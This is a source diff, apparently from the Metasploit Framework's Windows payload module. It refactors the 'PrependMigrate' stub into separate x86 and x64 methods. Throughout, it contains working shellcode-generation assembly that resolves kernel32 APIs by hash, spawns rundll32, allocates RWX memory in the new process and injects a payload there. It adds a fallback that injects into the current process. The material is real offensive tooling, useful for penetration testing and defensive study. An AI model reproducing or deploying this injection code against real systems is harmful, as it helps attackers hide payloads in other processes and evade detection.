@@ -75,14 +75,32 @@ module Msf::Payload::Windows
 		if test_arch.include?(ARCH_X86)
 			# PrependMigrate
 			if datastore['PrependMigrate'] and datastore['PrependMigrate'].to_s.downcase == 'true'
-				payloadsize = "0x%04x" % buf.length
-				procname = datastore['PrependMigrateProc'] || 'rundll32'
+				migrate_asm = prepend_migrate(buf)
+				pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
+			end
+		# Handle all x64 code here
+		elsif test_arch.include?(ARCH_X86_64) or test_arch.include?(ARCH_X64)
+			# PrependMigrate
+			if datastore['PrependMigrate'] and datastore['PrependMigrate'].to_s.downcase == 'true'
+				migrate_asm = prepend_migrate_64(buf)
+				pre << Metasm::Shellcode.assemble(Metasm::X64.new, migrate_asm).encode_string
+			end
+		end
+		return (pre + buf)
+	end
 
-				# Prepare instructions to get address of block_api into ebp
-				block_api_start = <<EOS
+	#
+	# Create assembly
+	#
+	def prepend_migrate(buf)
+		payloadsize = "0x%04x" % buf.length
+		procname = datastore['PrependMigrateProc'] || 'rundll32'
+
+		# Prepare instructions to get address of block_api into ebp
+		block_api_start = <<EOS
   call start
 EOS
-				block_api_asm = <<EOS
+		block_api_asm = <<EOS
 api_call:
   pushad                    ; We preserve all the registers for the caller, bar EAX and ECX.
   mov ebp, esp              ; Create a new stack frame
@@ -166,35 +184,35 @@ get_next_mod1:              ;
   jmp.i8 next_mod           ; Process this module
 ;--------------------------------------------------------------------------------------
 EOS
-				block_api_ebp_asm = <<EOS
+		block_api_ebp_asm = <<EOS
   pop ebp                   ; Pop off the address of 'api_call' for calling later.
 EOS
-				block_close_to_payload = ''
+		block_close_to_payload = ''
 
-				# Check if we can find block_api in the payload
-				block_api = Metasm::Shellcode.assemble(Metasm::Ia32.new, block_api_asm).encode_string
-				block_api_index = buf.index(block_api)
-				if block_api_index
+		# Check if we can find block_api in the payload
+		block_api = Metasm::Shellcode.assemble(Metasm::Ia32.new, block_api_asm).encode_string
+		block_api_index = buf.index(block_api)
+		if block_api_index
 
-					# Prepare instructions to calculate address
-					ebp_offset = "0x%04x" % (block_api_index + 5)
-					block_api_ebp_asm = <<EOS
+			# Prepare instructions to calculate address
+			ebp_offset = "0x%04x" % (block_api_index + 5)
+			block_api_ebp_asm = <<EOS
   jmp close_to_payload
 return_from_close_to_payload:
   pop ebp
   add ebp, #{ebp_offset}
 EOS
-					# Clear now-unneeded instructions
-					block_api_asm = ''
-					block_api_start = ''
-					block_close_to_payload = <<EOS
+			# Clear now-unneeded instructions
+			block_api_asm = ''
+			block_api_start = ''
+			block_close_to_payload = <<EOS
 close_to_payload:
   call return_from_close_to_payload
 EOS
-				end
+		end
 
-				#put all pieces together
-				migrate_asm = <<EOS
+		#put all pieces together
+		migrate_asm = <<EOS
   cld                       ; Clear the direction flag.
   #{block_api_start}
   #{block_api_asm}
@@ -202,21 +220,19 @@ start:
   #{block_api_ebp_asm}
   ; get our own startupinfo at esp+0x60
   add esp,-400              ; adjust the stack to avoid corruption
-  mov edx,esp
-  add edx,0x60
+  lea edx,[esp+0x60]
   push edx
   push 0xB16B4AB1           ; hash( "kernel32.dll", "GetStartupInfoA" )
   call ebp                  ; GetStartupInfoA( &si );
 
-  ; ptr to startupinfo is in eax
-  ; pointer to string is in ecx
+  lea eax,[esp+0x60]        ; Put startupinfo pointer back in eax
+
   jmp getcommand
   gotcommand:
   pop esi                   ; esi = address of process name (command line)
 
   ; create the process
-  mov edi,eax
-  add edi,0x60              ; Offset of empty space for lpProcessInformation
+  lea edi,[eax+0x60]        ; Offset of empty space for lpProcessInformation
   push edi                  ; lpProcessInformation : write processinfo here
   push eax                  ; lpStartupInfo : current info (read)
   xor ebx,ebx
@@ -232,6 +248,13 @@ start:
   push 0x863FCC79           ; hash( "kernel32.dll", "CreateProcessA" )
   call ebp                  ; CreateProcessA( &si );
 
+  ; if we didn't get a new process, use this one
+  test eax,eax
+  jnz goodProcess           ; Skip this next block if we got a new process
+  dec eax
+  mov [edi], eax            ; handle = NtCurrentProcess()
+
+goodProcess:
   ; allocate memory in the process (VirtualAllocEx())
   ; get handle
   push 0x40                 ; RWX
@@ -281,21 +304,19 @@ getcommand:
 begin_of_payload:
   call begin_of_payload_return
 EOS
+		migrate_asm
+	end
 
-				pre << Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string
-			end
-		# Handle all x64 code here
-		elsif test_arch.include?(ARCH_X86_64) or test_arch.include?(ARCH_X64)
-			# PrependMigrate
-			if datastore['PrependMigrate'] and datastore['PrependMigrate'].to_s.downcase == 'true'
-				payloadsize = "0x%04x" % buf.length
-				procname = datastore['PrependMigrateProc'] || 'rundll32'
 
-				# Prepare instructions to get address of block_api into ebp
-				block_api_start = <<EOS
+	def prepend_migrate_64(buf)
+		payloadsize = "0x%04x" % buf.length
+		procname = datastore['PrependMigrateProc'] || 'rundll32'
+
+		# Prepare instructions to get address of block_api into ebp
+		block_api_start = <<EOS
   call start
 EOS
-				block_api_asm = <<EOS
+		block_api_asm = <<EOS
 api_call:
   push r9                  ; Save the 4th parameter
   push r8                  ; Save the 3rd parameter
@@ -385,35 +406,35 @@ get_next_mod1:             ;
   mov rdx, [rdx]           ; Get the next module
   jmp next_mod             ; Process this module
 EOS
-				block_api_rbp_asm = <<EOS
+		block_api_rbp_asm = <<EOS
   pop rbp                   ; Pop off the address of 'api_call' for calling later.
 EOS
-				block_close_to_payload = ''
+		block_close_to_payload = ''
 
-				# Check if we can find block_api in the payload
-				block_api = Metasm::Shellcode.assemble(Metasm::X64.new, block_api_asm).encode_string
-				block_api_index = buf.index(block_api)
-				if block_api_index
+		# Check if we can find block_api in the payload
+		block_api = Metasm::Shellcode.assemble(Metasm::X64.new, block_api_asm).encode_string
+		block_api_index = buf.index(block_api)
+		if block_api_index
 
-					# Prepare instructions to calculate address
-					rbp_offset = "0x%04x" % (block_api_index + 5)
-					block_api_rbp_asm = <<EOS
+			# Prepare instructions to calculate address
+			rbp_offset = "0x%04x" % (block_api_index + 5)
+			block_api_rbp_asm = <<EOS
   jmp close_to_payload
 return_from_close_to_payload:
   pop rbp
   add rbp, #{rbp_offset}
 EOS
-					# Clear now-unneeded instructions
-					block_api_asm = ''
-					block_api_start = ''
-					block_close_to_payload = <<EOS
+			# Clear now-unneeded instructions
+			block_api_asm = ''
+			block_api_start = ''
+			block_close_to_payload = <<EOS
 close_to_payload:
   call return_from_close_to_payload
 EOS
-				end
+		end
 
-				#put all pieces together
-				migrate_asm = <<EOS
+		#put all pieces together
+		migrate_asm = <<EOS
   cld                       ; Clear the direction flag.
   #{block_api_start}
   #{block_api_asm}
@@ -421,23 +442,18 @@ start:
   #{block_api_rbp_asm}
   ; get our own startupinfo at esp+0x60
   add rsp,-400              ; adjust the stack to avoid corruption
-  mov rcx,rsp
-  add rcx,0x30
+  lea rcx,[rsp+0x30]
   mov r10d, 0xB16B4AB1      ; hash( "kernel32.dll", "GetStartupInfoA" )
   call rbp                  ; GetStartupInfoA( &si );
 
-  ; ptr to startupinfo is in rax
-  ; pointer to string is in rcx
   jmp getcommand
   gotcommand:
   pop rsi                   ; rsi = address of process name (command line)
 
   ; create the process
-  mov rdi,rsp               ; get rsp again
-  add rdi,0x110              ; Offset of empty space for lpProcessInformation
+  lea rdi,[rsp+0x110]       ; Offset of empty space for lpProcessInformation
   push rdi                  ; lpProcessInformation : write processinfo here
-  mov rcx,rsp
-  add rcx,0x58
+  lea rcx,[rsp+0x58]
   push rcx                  ; lpStartupInfo : current info (read)
   xor rcx,rcx
   push rcx                  ; lpCurrentDirectory
@@ -451,6 +467,13 @@ start:
   mov r10d, 0x863FCC79      ; hash( "kernel32.dll", "CreateProcessA" )
   call rbp                  ; CreateProcessA( &si );
 
+  ; if we didn't get a new process, use this one
+  test rax,rax
+  jnz goodProcess           ; Skip this next block if we got a new process
+  dec rax
+  mov [rdi], rax            ; handle = NtCurrentProcess()
+
+goodProcess:
   ; allocate memory in the process (VirtualAllocEx())
   ; get handle
   push 0x40                 ; RWX
@@ -501,11 +524,7 @@ getcommand:
 begin_of_payload:
   call begin_of_payload_return
 EOS
-
-				pre << Metasm::Shellcode.assemble(Metasm::X64.new, migrate_asm).encode_string
-			end
-		end
-		return (pre + buf)
+		migrate_asm
 	end
 
 	#
